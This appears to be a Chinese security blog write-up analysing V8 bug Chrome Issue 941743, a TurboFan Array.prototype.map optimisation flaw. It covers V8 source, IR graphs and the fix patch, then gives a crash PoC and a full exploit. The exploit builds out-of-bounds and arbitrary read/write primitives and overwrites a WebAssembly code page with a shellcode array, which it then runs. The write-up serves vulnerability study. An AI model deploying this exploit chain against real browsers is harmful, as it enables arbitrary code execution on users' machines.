# Chrome Issue 941743漏洞分析

阅读量 **279698**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-19 10:30:00

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t017090ca4c6843feb5.png)

## 0x00 前言

Issue
941743是2019年的一个v8方面的历史漏洞，其漏洞发生在对Array.prototype.map函数的Reduce过程，之前介绍过Array.prototype.map的一个回调漏洞，本文将介绍其在JIT层的一个优化漏洞。

## 0x01 前置知识

###  Array.prototype.map()

Array.prototype.map()函数用于从一个数组中根据函数关系创建一个映射，其语法如下

> var new_array = arr.map(function callback(currentValue[, index[, array]]) {  
>  // Return element for new_array  
>  }[, thisArg])

基本用法如下

    
    
    var a = [1,2,3];
    
    var b = a.map((value,index)=>{
       print("index="+index+" value=" + value);
       return value+1;
    });
    
    print("b=",b);
    

输出如下

    
    
    index=0 value=1
    index=1 value=2
    index=2 value=3
    b= 2,3,4
    

###  Array()函数调用链及JIT优化分析

####  源码分析

当我们执行`var a = Array(1)`时，首先调用的是`ArrayConstructor`，该函数位于`src/builtins/builtins-array-gen.cc`，按照源码分析，其调用链为`ArrayConstructor -> ArrayConstructorImpl ->
GenerateArrayNArgumentsConstructor -> TailCallRuntime`  
GenerateArrayNArgumentsConstructor函数如下，其结尾使用了`TailCallRuntime`去调用某个函数

    
    
    void ArrayBuiltinsAssembler::GenerateArrayNArgumentsConstructor(
        TNode<Context> context, TNode<JSFunction> target, TNode<Object> new_target,
        TNode<Int32T> argc, TNode<HeapObject> maybe_allocation_site) {
      // Replace incoming JS receiver argument with the target.
      // TODO(ishell): Avoid replacing the target on the stack and just add it
      // as another additional parameter for Runtime::kNewArray.
      CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));
      args.SetReceiver(target);
    
      // Adjust arguments count for the runtime call: +1 for implicit receiver
      // and +2 for new_target and maybe_allocation_site.
      argc = Int32Add(argc, Int32Constant(3));
      TailCallRuntime(Runtime::kNewArray, argc, context, new_target,
                      maybe_allocation_site);
    }
    

而`TailCallRuntime`函数在不同指令架构上有不同的实现，这里我们看`x64`架构的实现

    
    
    void MacroAssembler::TailCallRuntime(Runtime::FunctionId fid) {
      // ----------- S t a t e -------------      //  -- rsp[0]                 : return address
      //  -- rsp[8]                 : argument num_arguments - 1
      //  ...
      //  -- rsp[8 * num_arguments] : argument 0 (receiver)
      //
      //  For runtime functions with variable arguments:
      //  -- rax                    : number of  arguments
      // -----------------------------------    
      const Runtime::Function* function = Runtime::FunctionForId(fid);
      DCHECK_EQ(1, function->result_size);
      if (function->nargs >= 0) {
        Set(rax, function->nargs);
      }
      JumpToExternalReference(ExternalReference::Create(fid));
    }
    

通过`Runtime::FunctionForId(fid)`找到函数对象，在源码文件中`src/runtime/runtime.cc`中有定义

    
    
    const Runtime::Function* Runtime::FunctionForId(Runtime::FunctionId id) {
      return &(kIntrinsicFunctions[static_cast<int>(id)]);
    }
    

其中`kIntrinsicFunctions`的定义如下

    
    
    static const Runtime::Function kIntrinsicFunctions[] = {
        FOR_EACH_INTRINSIC(F) FOR_EACH_INLINE_INTRINSIC(I)};
    

宏定义`FOR_EACH_INTRINSIC`如下

    
    
    #define FOR_EACH_INTRINSIC_IMPL(F, I)       \
      FOR_EACH_INTRINSIC_RETURN_PAIR_IMPL(F, I) \
      FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I)
    #define FOR_EACH_INTRINSIC_RETURN_OBJECT_IMPL(F, I) \
      FOR_EACH_INTRINSIC_ARRAY(F, I)                    \
      FOR_EACH_INTRINSIC_ATOMICS(F, I)                  \
      FOR_EACH_INTRINSIC_BIGINT(F, I)                   \
      FOR_EACH_INTRINSIC_CLASSES(F, I)                  \
      FOR_EACH_INTRINSIC_COLLECTIONS(F, I)              \
      FOR_EACH_INTRINSIC_COMPILER(F, I)                 \
      FOR_EACH_INTRINSIC_DATE(F, I)                     \
      FOR_EACH_INTRINSIC_DEBUG(F, I)                    \
      FOR_EACH_INTRINSIC_FORIN(F, I)                    \
      FOR_EACH_INTRINSIC_FUNCTION(F, I)                 \
      FOR_EACH_INTRINSIC_GENERATOR(F, I)                \
      FOR_EACH_INTRINSIC_IC(F, I)                       \
      FOR_EACH_INTRINSIC_INTERNAL(F, I)                 \
      FOR_EACH_INTRINSIC_INTERPRETER(F, I)              \
      FOR_EACH_INTRINSIC_INTL(F, I)                     \
      FOR_EACH_INTRINSIC_LITERALS(F, I)                 \
      FOR_EACH_INTRINSIC_MODULE(F, I)                   \
      FOR_EACH_INTRINSIC_NUMBERS(F, I)                  \
      FOR_EACH_INTRINSIC_OBJECT(F, I)                   \
      FOR_EACH_INTRINSIC_OPERATORS(F, I)                \
      FOR_EACH_INTRINSIC_PROMISE(F, I)                  \
      FOR_EACH_INTRINSIC_PROXY(F, I)                    \
      FOR_EACH_INTRINSIC_REGEXP(F, I)                   \
      FOR_EACH_INTRINSIC_SCOPES(F, I)                   \
      FOR_EACH_INTRINSIC_STRINGS(F, I)                  \
      FOR_EACH_INTRINSIC_SYMBOL(F, I)                   \
      FOR_EACH_INTRINSIC_TEST(F, I)                     \
      FOR_EACH_INTRINSIC_TYPEDARRAY(F, I)               \
      FOR_EACH_INTRINSIC_WASM(F, I)                     \
      FOR_EACH_INTRINSIC_WEAKREF(F, I)
    

其中，我们较为关注的`kNewArray`函数在`FOR_EACH_INTRINSIC_ARRAY`里被注册

    
    
    #define FOR_EACH_INTRINSIC_ARRAY(F, I) \
      F(ArrayIncludes_Slow, 3, 1)          \
      F(ArrayIndexOf, 3, 1)                \
      F(ArrayIsArray, 1, 1)                \
      F(ArraySpeciesConstructor, 1, 1)     \
      F(GrowArrayElements, 2, 1)           \
      I(IsArray, 1, 1)                     \
      F(NewArray, -1 /* >= 3 */, 1)        \
      F(NormalizeElements, 1, 1)           \
      F(TransitionElementsKind, 2, 1)      \
      F(TransitionElementsKindWithKind, 2, 1)
    

由此可以知道`Array(1)`最终调用的是`NewArray`函数，该函数位于`src/runtime/runtime-array.cc`文件

    
    
    RUNTIME_FUNCTION(Runtime_NewArray) {
      HandleScope scope(isolate);
      DCHECK_LE(3, args.length());
      int const argc = args.length() - 3;
      // argv points to the arguments constructed by the JavaScript call.
      JavaScriptArguments argv(argc, args.address_of_arg_at(0));
      CONVERT_ARG_HANDLE_CHECKED(JSFunction, constructor, argc);
      CONVERT_ARG_HANDLE_CHECKED(JSReceiver, new_target, argc + 1);
      CONVERT_ARG_HANDLE_CHECKED(HeapObject, type_info, argc + 2);
      // TODO(bmeurer): Use MaybeHandle to pass around the AllocationSite.
      Handle<AllocationSite> site = type_info->IsAllocationSite()
                                        ? Handle<AllocationSite>::cast(type_info)
                                        : Handle<AllocationSite>::null();
    
      Factory* factory = isolate->factory();
    
      // If called through new, new.target can be:
      // - a subclass of constructor,
      // - a proxy wrapper around constructor, or
      // - the constructor itself.
      // If called through Reflect.construct, it's guaranteed to be a constructor by
      // REFLECT_CONSTRUCT_PREPARE.
      DCHECK(new_target->IsConstructor());
    
      bool holey = false;
      bool can_use_type_feedback = !site.is_null();
      bool can_inline_array_constructor = true;
      if (argv.length() == 1) {
        Handle<Object> argument_one = argv.at<Object>(0);
        if (argument_one->IsSmi()) {
          int value = Handle<Smi>::cast(argument_one)->value();
          if (value < 0 ||
              JSArray::SetLengthWouldNormalize(isolate->heap(), value)) {
            // the array is a dictionary in this case.
            can_use_type_feedback = false;
          } else if (value != 0) {
            holey = true;
            if (value >= JSArray::kInitialMaxFastElementArray) {
              can_inline_array_constructor = false;
            }
          }
        } else {
          // Non-smi length argument produces a dictionary
          can_use_type_feedback = false;
        }
      }
      ...............................省略线......................
    if (!site.is_null()) {
        if ((old_kind != array->GetElementsKind() || !can_use_type_feedback ||
             !can_inline_array_constructor)) {
          // The arguments passed in caused a transition. This kind of complexity
          // can't be dealt with in the inlined optimized array constructor case.
          // We must mark the allocationsite as un-inlinable.
          site->SetDoNotInlineCall();
        }
      } else {
        if (old_kind != array->GetElementsKind() || !can_inline_array_constructor) {
          // We don't have an AllocationSite for this Array constructor invocation,
          // i.e. it might a call from Array#map or from an Array subclass, so we
          // just flip the bit on the global protector cell instead.
          // TODO(bmeurer): Find a better way to mark this. Global protectors
          // tend to back-fire over time...
          if (Protectors::IsArrayConstructorIntact(isolate)) {
            Protectors::InvalidateArrayConstructor(isolate);
          }
        }
    

以上代码，仅保留了我们较为关注的地方，从中可以看出，如果数组元素类型为`Smi`类型，并且`value >=
JSArray::kInitialMaxFastElementArray`成立，也就是数组长度大于`JSArray::kInitialMaxFastElementArray`值的时候，`can_inline_array_constructor`被标记为`false`，最终，因为该标记,`site->SetDoNotInlineCall()`函数被调用。该标记最终将会在`src/compiler/js-create-lowering.cc`文件中的`ReduceJSCreateArray`函数中使用

    
    
        if (length_type.Maybe(Type::UnsignedSmall()) && can_inline_call) {
          return ReduceNewArray(node, length, *initial_map, elements_kind,
                                allocation, slack_tracking_prediction);
        }
        ...........省略线...............
        if (values_all_smis) {
          // Smis can be stored with any elements kind.
        } else if (values_all_numbers) {
          elements_kind = GetMoreGeneralElementsKind(
              elements_kind, IsHoleyElementsKind(elements_kind)
                                 ? HOLEY_DOUBLE_ELEMENTS
                                 : PACKED_DOUBLE_ELEMENTS);
        } else if (values_any_nonnumber) {
          elements_kind = GetMoreGeneralElementsKind(
              elements_kind, IsHoleyElementsKind(elements_kind) ? HOLEY_ELEMENTS
                                                                : PACKED_ELEMENTS);
        } else if (!can_inline_call) {
          // We have some crazy combination of types for the {values} where
          // there's no clear decision on the elements kind statically. And
          // we don't have a protection against deoptimization loops for the
          // checks that are introduced in the call to ReduceNewArray, so
          // we cannot inline this invocation of the Array constructor here.
          return NoChange();
        }
        return ReduceNewArray(node, values, *initial_map, elements_kind, allocation,
                              slack_tracking_prediction);
    

从分析中可以看出，该标记将影响`Array(1)`这个函数在JIT编译时是否会被内联优化。

####  IR图分析

首先，我们的测试代码如下，需要知道的一点是`Array.prototype.map`内部会调用`JSCreateArray`来创建新数组存放结果

    
    
    //将can_inline_array_constructor设置为false
    Array(2**30);
    
    function opt() {
       var a = [1,2,3];
       var b = a.map((value,index) => {
          return value;
       });
       return b;
    }
    
    
    for (var i=0;i<0x10000;i++) {
       opt();
    }
    

其IR图如下，可以看到，在`typed lowering`阶段，`JSCreateArray`并没有被优化为`JIT`代码，其仍然为JS层的代码调用。

![](https://p1.ssl.qhimg.com/t013ae2e074ab838043.png)

接下来，我们去除测试脚本里的`Array(2**30);`这句，然后重新查看IR图，可以发现，其被优化成了本地代码了。

![](https://p5.ssl.qhimg.com/t01dbd08464cef25161.jpg)

## 0x02 漏洞分析

###  patch分析

    
    
    diff --git a/src/compiler/js-call-reducer.cc b/src/compiler/js-call-reducer.cc
    index 636bdc1..d37f461 100644
    --- a/src/compiler/js-call-reducer.cc
    +++ b/src/compiler/js-call-reducer.cc
    @@ -1538,6 +1538,13 @@
           simplified()->LoadField(AccessBuilder::ForJSArrayLength(kind)), receiver,
           effect, control);
    
    +  // If the array length >= kMaxFastArrayLength, then CreateArray
    +  // will create a dictionary. We should deopt in this case, and make sure
    +  // not to attempt inlining again.
    +  original_length = effect = graph()->NewNode(
    +      simplified()->CheckBounds(p.feedback()), original_length,
    +      jsgraph()->Constant(JSArray::kMaxFastArrayLength), effect, control);
    +
       // Even though {JSCreateArray} is not marked as {kNoThrow}, we can elide the
       // exceptional projections because it cannot throw with the given parameters.
       Node* a = control = effect = graph()->NewNode(
    

该patch用于修复漏洞，patch位于`src/compiler/js-call-reducer.cc`文件中的`JSCallReducer::ReduceArrayMap`函数，该函数是对`Array.prototype.map`函数进行优化的，patch中主要增加了一个对`源数组的长度`进行检查，检查其是否大于`kMaxFastArrayLength`，因为添加的是一个`CheckBounds`节点，所以如果大于的话将`deoptimization
bailout`从而不使用其生成的JIT代码。  
我们来分析一下代码

    
    
      Node* original_length = effect = graph()->NewNode(
          simplified()->LoadField(AccessBuilder::ForJSArrayLength(kind)), receiver,
          effect, control);
    
      // 根据original_length，调用JSCreateArray创建一个新数组
      Node* a = control = effect = graph()->NewNode(
          javascript()->CreateArray(1, MaybeHandle<AllocationSite>()),
          array_constructor, array_constructor, original_length, context,
          outer_frame_state, effect, control);
    
      Node* checkpoint_params[] = {receiver, fncallback, this_arg,
                                   a,        k,          original_length};
      const int stack_parameters = arraysize(checkpoint_params);
    
      // 检查map的回调函数是否可用，如果可以，就进行调用
      Node* check_frame_state = CreateJavaScriptBuiltinContinuationFrameState(
          jsgraph(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,
          node->InputAt(0), context, &checkpoint_params[0], stack_parameters,
          outer_frame_state, ContinuationFrameStateMode::LAZY);
      Node* check_fail = nullptr;
      Node* check_throw = nullptr;
      WireInCallbackIsCallableCheck(fncallback, context, check_frame_state, effect,
                                    &control, &check_fail, &check_throw);
    
      // 调用回调函数生成映射值
      Node* vloop = k = WireInLoopStart(k, &control, &effect);
      Node *loop = control, *eloop = effect;
      checkpoint_params[4] = k;
    
      Node* continue_test =
          graph()->NewNode(simplified()->NumberLessThan(), k, original_length);
      Node* continue_branch = graph()->NewNode(common()->Branch(BranchHint::kNone),
                                               continue_test, control);
    
      Node* if_true = graph()->NewNode(common()->IfTrue(), continue_branch);
      Node* if_false = graph()->NewNode(common()->IfFalse(), continue_branch);
      control = if_true;
    
      Node* frame_state = CreateJavaScriptBuiltinContinuationFrameState(
          jsgraph(), shared, Builtins::kArrayMapLoopEagerDeoptContinuation,
          node->InputAt(0), context, &checkpoint_params[0], stack_parameters,
          outer_frame_state, ContinuationFrameStateMode::EAGER);
    
      effect =
          graph()->NewNode(common()->Checkpoint(), frame_state, effect, control);
    
      // Make sure the map hasn't changed during the iteration
      effect =
          graph()->NewNode(simplified()->CheckMaps(CheckMapsFlag::kNone,
                                                   receiver_maps, p.feedback()),
                           receiver, effect, control);
    
      Node* element =
          SafeLoadElement(kind, receiver, control, &effect, &k, p.feedback());
    
      Node* next_k =
          graph()->NewNode(simplified()->NumberAdd(), k, jsgraph()->OneConstant());
    
      Node* hole_true = nullptr;
      Node* hole_false = nullptr;
      Node* effect_true = effect;
    
      if (IsHoleyElementsKind(kind)) {
        // 跳过无值的空洞
        Node* check;
        if (IsDoubleElementsKind(kind)) {
          check = graph()->NewNode(simplified()->NumberIsFloat64Hole(), element);
        } else {
          check = graph()->NewNode(simplified()->ReferenceEqual(), element,
                                   jsgraph()->TheHoleConstant());
        }
        Node* branch =
            graph()->NewNode(common()->Branch(BranchHint::kFalse), check, control);
        hole_true = graph()->NewNode(common()->IfTrue(), branch);
        hole_false = graph()->NewNode(common()->IfFalse(), branch);
        control = hole_false;
    
        // The contract is that we don't leak "the hole" into "user JavaScript",
        // so we must rename the {element} here to explicitly exclude "the hole"
        // from the type of {element}.
        element = effect = graph()->NewNode(
            common()->TypeGuard(Type::NonInternal()), element, effect, control);
      }
    
      // This frame state is dealt with by hand in
      // ArrayMapLoopLazyDeoptContinuation.
      frame_state = CreateJavaScriptBuiltinContinuationFrameState(
          jsgraph(), shared, Builtins::kArrayMapLoopLazyDeoptContinuation,
          node->InputAt(0), context, &checkpoint_params[0], stack_parameters,
          outer_frame_state, ContinuationFrameStateMode::LAZY);
    
      Node* callback_value = control = effect = graph()->NewNode(
          javascript()->Call(5, p.frequency()), fncallback, this_arg, element, k,
          receiver, context, frame_state, effect, control);
    
      // Rewire potential exception edges.
      Node* on_exception = nullptr;
      if (NodeProperties::IsExceptionalCall(node, &on_exception)) {
        RewirePostCallbackExceptionEdges(check_throw, on_exception, effect,
                                         &check_fail, &control);
      }
    
      // The array {a} should be HOLEY_SMI_ELEMENTS because we'd only come into this
      // loop if the input array length is non-zero, and "new Array({x > 0})" always
      // produces a HOLEY array.
      MapRef holey_double_map =
          native_context().GetInitialJSArrayMap(HOLEY_DOUBLE_ELEMENTS);
      MapRef holey_map = native_context().GetInitialJSArrayMap(HOLEY_ELEMENTS);
      //将值存入数组
      effect = graph()->NewNode(simplified()->TransitionAndStoreElement(
                                    holey_double_map.object(), holey_map.object()),
                                a, k, callback_value, effect, control);
    
      if (IsHoleyElementsKind(kind)) {
        Node* after_call_and_store_control = control;
        Node* after_call_and_store_effect = effect;
        control = hole_true;
        effect = effect_true;
    
        control = graph()->NewNode(common()->Merge(2), control,
                                   after_call_and_store_control);
        effect = graph()->NewNode(common()->EffectPhi(2), effect,
                                  after_call_and_store_effect, control);
      }
    
      WireInLoopEnd(loop, eloop, vloop, next_k, control, effect);
    
      control = if_false;
      effect = eloop;
    
      // Wire up the branch for the case when IsCallable fails for the callback.
      // Since {check_throw} is an unconditional throw, it's impossible to
      // return a successful completion. Therefore, we simply connect the successful
      // completion to the graph end.
      Node* throw_node =
          graph()->NewNode(common()->Throw(), check_throw, check_fail);
      NodeProperties::MergeControlToEnd(graph(), common(), throw_node);
    
      ReplaceWithValue(node, a, effect, control);
      return Replace(a);
    }
    

以上代码看似没有什么问题，但忽略了`JSCreateArray`的一个特性，如果要申请的大小大于某个阈值（`0x2000000`），那么其返回的对象，其`Element`不再是数组类型，而是`Dictionary`类型，测试代码

    
    
    var a = Array(0x2000001);
    %DebugPrint(a);
    DebugPrint: 0x19c022c0dbf1: [JSArray]
     - map: 0x3427e398a9f9 <Map(DICTIONARY_ELEMENTS)> [FastProperties]
     - prototype: 0x1e11fad11081 <JSArray[0]>
     - elements: 0x19c022c0dc11 <NumberDictionary[16]> [DICTIONARY_ELEMENTS]
     - length: 33554433
     - properties: 0x342395d80c21 <FixedArray[0]> {
        #length: 0x3538bdb001a9 <AccessorInfo> (const accessor descriptor)
     }
     - elements: 0x19c022c0dc11 <NumberDictionary[16]> {
       - max_number_key: 0
     }
    0x3427e398a9f9: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 32
     - inobject properties: 0
     - elements kind: DICTIONARY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x3427e3982fc9 <Map(HOLEY_ELEMENTS)>
     - prototype_validity cell: 0x3538bdb00609 <Cell value= 1>
     - instance descriptors (own) #1: 0x1e11fad11e69 <DescriptorArray[1]>
     - layout descriptor: (nil)
     - prototype: 0x1e11fad11081 <JSArray[0]>
     - constructor: 0x1e11fad10e31 <JSFunction Array (sfi = 0x3538bdb0ac69)>
     - dependent code: 0x342395d802c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
     - construction counter: 0
    

当`JSCreateArray`返回的是`Dictionary`类型时，V8的优化代码仍然是以数组连续的方式写值的。在就导致了数组溢出。

###  POC

    
    
    Array(2**30);
    
    function opt(a) {
       return a.map((value,index)=>{return value});
    }
    
    var a = [1,2,3,,,,4];
    for (var i=0;i<0x20000;i++) {
       opt(a);
    }
    
    a.length = 0x2000000;
    a.fill(1,0);
    a.length += 0x66;
    //溢出
    opt(a);
    

调试过程，报了`Segmentation fault.`错误，这是因为越界写，超过了可访问的区域。

    
    
    Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
    0x00000d833f382f6a in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────
     RAX  0x2c9f5e100139 ◂— 0x210000242e4080a9
     RBX  0x2c9f5e100159 ◂— 0x352a634016
     RCX  0x2000066
     RDX  0x7fc28f74a0bd ◂— 'end - start <= kHandleBlockSize'
     RDI  0x7ffc6bfa0c48 —▸ 0x2c9f5e100139 ◂— 0x210000242e4080a9
     RSI  0x34218f8017d9 ◂— 0x352a63400f
     R8   0xffd3
     R9   0xae2d8a02b31 ◂— 0x210000242e40802e
     R10  0x100000000
     R11  0x242e40802e89 ◂— 0x40000352a634001
     R12  0x1
     R13  0x55715eb87e50 —▸ 0x352a63400751 ◂— 0x5a0000352a634004
     R14  0xffd3
     R15  0x6
     RBP  0x7ffc6bfa0d18 —▸ 0x7ffc6bfa0d80 —▸ 0x7ffc6bfa0da8 —▸ 0x7ffc6bfa0e10 —▸ 0x7ffc6bfa0e60 ◂— ...
     RSP  0x7ffc6bfa0ce0 ◂— 0x2
     RIP  0xd833f382f6a ◂— vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0
    ───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
     ► 0xd833f382f6a    vmovsd qword ptr [rbx + r14*8 + 0xf], xmm0
       0xd833f382f71    jmp    0xd833f382e90 <0xd833f382e90>
    

###  疑难问题

我们还注意到一个细节，我们的数组是`HOLEY_SMI_ELEMENTS`，首先，`SMI`是为了满足`JSCreateArray`不内联的条件，而`HOLEY`是为了能够溢出方便控制内存，因为空洞的原因，不会对某块区域进行写，从而不至于破坏内存中其他地方，仅去覆盖我们需要的地方。

    
    
    var a = [1,2,3,,,,4];
    

另一个问题是为何要防止`JSCreateArray`内联，首先，我们去除开头的`Array(2**30)`，然后观察IR图。没内联时是这样的

![](https://p4.ssl.qhimg.com/t010436f811ca725bf5.jpg)

内联以后是这样的，因为内联多了个`CheckBound`，且我们触发漏洞的length显然超过这个范围，这将导致直接`deoptimization
bailout`。

![](https://p0.ssl.qhimg.com/t01c023528351b283b9.jpg)

gdb调试如下

    
    
    0x00003bbfbc0830fb in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────
     RAX  0x1caece4004d1 ◂— 0x1caece4005
     RBX  0x7fa156f631b0 ◂— push   rbp
     RCX  0x335e74882b69 ◂— 0x21000029b2ef682e
     RDX  0x560d0e592ac0 —▸ 0x560d0e607a30 ◂— 0x1baddead0baddeaf
     RDI  0x29b2ef682e89 ◂— 0x400001caece4001
     RSI  0x3a04229817d9 ◂— 0x1caece400f
     R8   0x2000066
     R9   0x200006600000000
     R10  0x100000000
     R11  0x7fa156b61270 (v8::internal::IncrementalMarking::RetainMaps()) ◂— push   rbp
     R12  0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 —▸ 0x7fffe6d13cc0 ◂— ...
     R13  0x560d0e588e70 —▸ 0x1caece400751 ◂— 0xde00001caece4004
     R14  0x1caece4005b1 ◂— 0xff00001caece4005
     R15  0x7fffe6d13810 —▸ 0x3bbfbc08304a ◂— jmp    0x3bbfbc082e16
     RBP  0x7fffe6d13848 —▸ 0x7fffe6d138b0 —▸ 0x7fffe6d138d8 —▸ 0x7fffe6d13940 —▸ 0x7fffe6d13990 ◂— ...
     RSP  0x7fffe6d13818 —▸ 0x3a042299f563 ◂— 0x1caece
    *RIP  0x3bbfbc0830fb ◂— mov    r13, 2
    ───────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────
       0x3bbfbc082e48    jae    0x3bbfbc082e5c <0x3bbfbc082e5c>
        ↓
       0x3bbfbc082e5c    mov    r9, r8
       0x3bbfbc082e5f    shl    r9, 0x20
       0x3bbfbc082e63    cmp    r8d, 0x7ff8
       0x3bbfbc082e6a    jae    0x3bbfbc0830fb <0x3bbfbc0830fb>
        ↓
     ► 0x3bbfbc0830fb    mov    r13, 2
       0x3bbfbc083102    call   0x3bbfbc102040 <0x3bbfbc102040>
    

可以看到，因为`cmp r8d, 0x7ff8`比较不通过导致直接`deoptimization
bailout`了，因此`JSCreateArray`不能内联。

###  exp

通过溢出，覆盖`Array`的length，从而构造一个能自由控制的`oob`数组，然后就很容易利用了，当我们完成构造`oob`数组以后，我们使用`throw`抛出一个异常，从而可以使得`map`函数停止向后的迭代。

    
    
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    
    //使得TurboFan不会将JSCreateArray内联化
    Array(2**30);
    
    var oob_arr;
    var obj_arr;
    var arr_buf;
    var oob_arr_length_idx = 0x18;
    
    function opt(arr,flag) {
       return arr.map((value,index)=>{
          if (index == 0) {
             oob_arr = [1.1,2.2,3.3];
             obj_arr = [{}];
             arr_buf = new ArrayBuffer(0x10);
             if (flag) {
                /*%DebugPrint(a);
                %DebugPrint(oob_arr);*/
             }
          } else if (index > oob_arr_length_idx) {
             throw "oob finished!"
          }
          return value;
       });
    }
    
    //HOLEY_SMI_ELEMENTS的数组
    var a = [1,2,,3];
    for (var i=0;i < 0x10000; i++) {
       opt(a,false);
    }
    
    a.length = 0x2000000;
    a.fill(1,0x18); //从0x18开始，为hole的在map时自动跳过,这样不至于损坏数据
    a.length += 0x66;
    
    try {
       opt(a,true);
    } catch (e) {
       if (oob_arr.length > 3) {
          print("oob success!");
       } else {
          throw "oob failed!";
       }
    }
    
    //%DebugPrint(oob_arr);
    //%DebugPrint(obj_arr);
    
    function addressOf(obj) {
       obj_arr[0] = obj;
       return u64f(oob_arr[0x10]) - 0x1n;
    }
    
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    
    var wasm_shellcode_ptr_addr = addressOf(wasmInstance) + 0x100n;
    //%DebugPrint(wasmInstance);
    
    
    /*%DebugPrint(oob_arr);
    %DebugPrint(arr_buf);
    */
    
    oob_arr[0x18] = i2f64(0x100);
    oob_arr[0x19] = i2f64(wasm_shellcode_ptr_addr);
    var adv = new DataView(arr_buf);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    oob_arr[0x19] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //执行shellcode
    func();
    

## 0x03 感想

通过本次实践，对于V8的知识又增加了，还得不断的学习。

![](https://p1.ssl.qhimg.com/t012bf3353e05330284.jpg)

## 0x04 参考

[Array.prototype.map()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/map)  
[把握机会之窗：看我如何获得Chrome 1-day漏洞并实现利用](https://zhuanlan.zhihu.com/p/62206287)  
[Chrome M73 issue
941743](https://laptrinhx.com/chrome-m73-issue-941743-2744271499/)

![](https://p0.ssl.qhimg.com/t015a79e97db3277ed2.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ha1vk@赛宁网安天虞实验室** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/234429](/post/id/234429)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [二进制安全](/tag/二进制安全)
  * [浏览器逃逸](/tag/浏览器逃逸)

 **+1** __2赞

 __收藏

![](https://p5.ssl.qhimg.com/t015704b4b2e374eb33.jpg) ha1vk@赛宁网安天虞实验室

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

